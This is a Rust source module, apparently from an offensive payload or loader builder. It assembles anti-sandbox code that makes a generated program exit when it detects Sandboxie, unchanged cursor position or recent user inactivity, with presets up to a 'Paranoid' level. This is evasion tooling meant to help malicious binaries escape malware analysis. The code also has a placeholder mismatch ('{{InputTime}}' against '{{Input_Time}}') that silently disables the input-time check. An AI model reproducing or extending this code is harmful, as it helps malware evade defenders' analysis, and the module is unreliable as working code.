#![allow(dead_code)]

use owo_colors::{OwoColorize, Stream::Stdout};
use regex::Regex;
use rust_embed::RustEmbed;
use std::collections::HashMap;
use std::path::PathBuf;

use crate::template::{Level, Sandbox, SandboxDetection};

mod sandbox_detection;

#[derive(RustEmbed)]
#[folder = "src/detection/sandbox"]
pub struct SandboxLibrary;

pub fn meta_sandbox(sandbox: &Option<Sandbox>) -> HashMap<String, String> {
    let mut result: HashMap<String, String> = HashMap::new();

    let mut detection_files: HashMap<SandboxDetection, String> = HashMap::new();
    let mut filepath: String;
    for file in SandboxLibrary::iter() {
        if let Some(content) = PathBuf::from(file.as_ref()).file_name() {
            filepath = file.to_string();
            match content.to_str().unwrap() {
                "sbiedll.rs" => {
                    detection_files.insert(SandboxDetection::Sbiedll, filepath);
                }
                "cursor.rs" => {
                    detection_files.insert(SandboxDetection::CursorPosition, filepath);
                }
                "input_time.rs" => {
                    detection_files.insert(SandboxDetection::InputTime, filepath);
                }
                _ => {}
            }
        }
    }

    let mut presets: HashMap<Level, Vec<SandboxDetection>> = HashMap::new();
    presets.insert(Level::Low, vec![SandboxDetection::Sbiedll]);
    presets.insert(Level::Basic, vec![SandboxDetection::Sbiedll]);
    presets.insert(
        Level::Paranoid,
        vec![
            SandboxDetection::Sbiedll,
            SandboxDetection::InputTime,
            SandboxDetection::CursorPosition,
        ],
    );

    let mut sandbox_functions = r#"
fn sandbox() {
    if {{Sbiedll}} ||
       {{Cursor}} ||
       {{InputTime}} {
       std::process::exit(0);
    }
}"#
    .to_string();

    let custom_functions = match sandbox {
        Some(content) => match &content.preset {
            Some(level) => presets.get(level).unwrap(),
            None => sandbox.as_ref().unwrap().custom.as_ref().unwrap(),
        },
        None => {
            let mut none: HashMap<String, String> = HashMap::new();
            none.insert("main".to_string(), "".to_string());
            none.insert("sandbox_functions".to_string(), "".to_string());
            none.insert("dependencies".to_string(), "".to_string());
            none.insert("imports".to_string(), "".to_string());
            return none;
        }
    };

    print!(
        "{} Adding sandbox protection. Detection methods:",
        "[+]".if_supports_color(Stdout, |text| text.green()),
    );
    for method in custom_functions {
        print!(
            " {}",
            method
                .as_ref()
                .if_supports_color(Stdout, |text| text.yellow())
        );
    }
    println!();

    for technique in custom_functions {
        let antidebug_function = SandboxLibrary::get(detection_files.get(technique).unwrap())
            .expect("Failed to get content")
            .data;
        sandbox_functions.push_str(std::str::from_utf8(antidebug_function.as_ref()).unwrap());
        sandbox_functions = match technique {
            SandboxDetection::Sbiedll => sandbox_functions.replace("{{Sbiedll}}", "sbiedll()"),
            SandboxDetection::CursorPosition => {
                sandbox_functions.replace("{{Cursor}}", "cursor_position()")
            }
            SandboxDetection::InputTime => {
                sandbox_functions.replace("{{Input_Time}}", "input_time()")
            }
        }
    }

    let rg = Regex::new(r"\{\{[a-zA-Z]+}}").unwrap();
    sandbox_functions = rg
        .replace_all(sandbox_functions.as_str(), "false")
        .to_string();

    let main = "sandbox();".to_string();
    let dependencies = r#"
    kernel32-sys = "0.2.2"
    "#
    .to_string();
    let imports = "".to_string();
    result.insert(String::from("main"), main);
    result.insert(String::from("sandbox_functions"), sandbox_functions);
    result.insert(String::from("dependencies"), dependencies);
    result.insert(String::from("imports"), imports);
    println!(
        "{} Added sandbox protection!",
        "[+]".if_supports_color(Stdout, |text| text.green())
    );
    result
}
